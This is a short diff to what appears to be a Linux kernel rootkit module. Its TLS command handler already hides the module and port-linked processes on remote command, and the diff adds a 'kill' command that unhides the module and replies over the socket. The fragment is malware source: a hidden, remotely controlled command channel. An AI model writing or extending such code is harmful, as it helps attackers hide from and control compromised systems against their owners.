@@ -365,6 +365,11 @@ void read_TLS(struct work_struct* work) {
         } else {
             hide();
         }
+    } else if (memcmp("kill", buffer, 4) == 0) {
+        printk(KERN_INFO "Killswitch engaged\n");
+        show();
+        strcpy(buffer, "foobar");
+        send_msg(svc->tls_socket, buffer, strlen("foobar"));
         //Processes that need to be killed when they aren't hidden
     } else if (memcmp("hidek", buffer, 5) == 0) {
         if (kstrtou16(buffer + 6, 10, &tmp_port)) {
